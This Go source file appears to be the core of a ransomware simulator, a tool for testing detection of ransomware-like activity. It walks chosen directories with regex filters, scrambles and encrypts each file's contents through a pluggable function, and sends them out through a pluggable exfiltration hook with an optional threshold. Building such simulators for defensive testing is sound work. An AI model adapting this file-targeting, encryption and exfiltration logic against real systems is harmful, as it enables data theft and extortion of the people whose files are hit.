package ransimware

import (
	"crypto/rand"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"time"

	"github.com/mjwhitta/errors"
	"github.com/mjwhitta/log"
	"github.com/mjwhitta/pathname"
	"github.com/mjwhitta/safety"
	tp "github.com/mjwhitta/threadpool"
)

// Simulator is a struct containing all simulation metadata.
type Simulator struct {
	count          *safety.Uint64
	Encrypt        func(fn string, b []byte) ([]byte, error)
	excludes       []*regexp.Regexp
	Exfil          func(fn string, b []byte) error
	ExfilFilenames bool
	ExfilThreshold uint64
	includes       []*regexp.Regexp
	last           []time.Time
	MaxFileSize    int64
	Notify         func() error
	OTP            [32]byte
	paths          []string
	Threads        int
	WaitEvery      time.Duration
	WaitFor        time.Duration
}

// New will return a pointer to a new Simulator instance.
func New(threads int) *Simulator {
	var e error
	var s = &Simulator{
		count:       safety.NewUint64(),
		Encrypt:     DefaultEncrypt,
		Exfil:       DefaultExfil,
		MaxFileSize: 128 * 1024 * 1024,
		Notify:      DefaultNotify,
		Threads:     threads,
	}

	if _, e = rand.Read(s.OTP[:]); e != nil {
		// Fallback to hard-coded incrementing bytes
		s.OTP[0] = 0x41
		for i := 1; i < 32; i++ {
			s.OTP[i] = s.OTP[i-1] + 1
		}
	}

	return s
}

// Exclude will add the specified pattern to the do-not-target list.
func (s *Simulator) Exclude(pattern string) error {
	var e error
	var r *regexp.Regexp

	// Ensure valid regex
	if r, e = regexp.Compile(pattern); e != nil {
		return errors.Newf("invalid regex %s: %w", pattern, e)
	}

	s.excludes = append(s.excludes, r)
	return nil
}

// Include will add the specified pattern to the target list.
func (s *Simulator) Include(pattern string) error {
	var e error
	var r *regexp.Regexp

	// Ensure valid regex
	if r, e = regexp.Compile(pattern); e != nil {
		return errors.Newf("invalid regex %s: %w", pattern, e)
	}

	s.includes = append(s.includes, r)
	return nil
}

func (s *Simulator) processFile(tid int, data tp.ThreadData) {
	var contents []byte
	var e error
	var exfil bool = true
	var f *os.File
	var path string = data["path"].(string)
	var size uint64
	var tmp []byte

	// Check if delay is needed
	s.last[tid] = wait(s.last[tid], s.WaitEvery, s.WaitFor)

	if f, e = os.Open(path); e != nil {
		e = errors.Newf("failed to open %s: %w", path, e)
		log.Err(e.Error())
		return
	}
	defer f.Close()

	// Read file
	if contents, e = io.ReadAll(f); e != nil {
		e = errors.Newf("failed to read %s: %w", path, e)
		log.Err(e.Error())
		return
	}

	// Close file
	f.Close()

	// Turn file contents into garbage
	for i := range contents {
		contents[i] ^= s.OTP[i%32]
	}

	// Encrypt contents
	if tmp, e = s.Encrypt(path, contents); e != nil {
		e = errors.Newf("Encrypt returned error: %w", e)
		log.Err(e.Error())
		tmp = contents
	}

	// If threshold is achieved, stop data exfil
	if s.ExfilThreshold > 0 {
		exfil = false
		size = uint64(len(tmp))

		if s.ExfilThreshold > size {
			exfil = s.count.LessEqualAdd(s.ExfilThreshold-size, size)
		}
	}

	// Exfil
	if exfil {
		if !s.ExfilFilenames {
			path = ""
		}

		if e = s.Exfil(path, tmp); e != nil {
			e = errors.Newf("Exfil returned error: %w", e)
			log.Err(e.Error())
		}
	}
}

// Target will add a path to the simulator.
func (s *Simulator) Target(path string) error {
	var e error
	var ok bool

	// Ensure path exists
	if ok, e = pathname.DoesExist(path); e != nil {
		return errors.Newf("target %s not accessible: %w", path, e)
	} else if !ok {
		return errors.Newf("target %s not found", path)
	}

	if path, e = filepath.Abs(path); e != nil {
		return errors.Newf(
			"failed to get absolute path for %s: %w",
			path,
			e,
		)
	}

	s.paths = append(s.paths, path)
	return nil
}

// Run will start the simulator.
func (s *Simulator) Run() error {
	var e error
	var include bool
	var last time.Time = time.Now()
	var pool *tp.ThreadPool

	// Initialize ThreadPool
	if pool, e = tp.New(s.Threads); e != nil {
		return errors.Newf("failed to initialize thread pool: %w", e)
	}
	defer pool.Close()

	// Initialize array of intermittent delays
	s.last = make([]time.Time, s.Threads+1)
	for i := range s.last {
		s.last[i] = last
	}

	// Walk paths
	for _, root := range s.paths {
		e = filepath.WalkDir(
			root,
			func(path string, d fs.DirEntry, e error) error {
				var info fs.FileInfo

				// Check if delay is needed
				s.last[0] = wait(s.last[0], s.WaitEvery, s.WaitFor)

				if e != nil {
					// Ignore errors as we want to traverse everything
					// we possibly can
					return nil
				}

				// Ignore directories and symlinks
				if d.IsDir() {
					return nil
				}

				if info, e = d.Info(); e != nil {
					e = errors.Newf("failed to get file info: %w", e)
					return e
				} else if (info.Mode() & os.ModeSymlink) > 0 {
					return nil
				}

				// Ignore files larger than MaxFileSize
				if info.Size() > s.MaxFileSize {
					return nil
				}

				// Check includes and excludes
				include = len(s.includes) == 0
				for _, r := range s.includes {
					if r.MatchString(path) {
						include = true
						break
					}
				}

				if !include {
					return nil
				}

				for _, r := range s.excludes {
					if r.MatchString(path) {
						return nil
					}
				}

				// Process file
				pool.Queue(s.processFile, tp.ThreadData{"path": path})

				return nil
			},
		)
		if e != nil {
			log.Err(e.Error())
		}
	}

	// Wait for all threads to finish
	pool.Wait()

	return s.Notify()
}
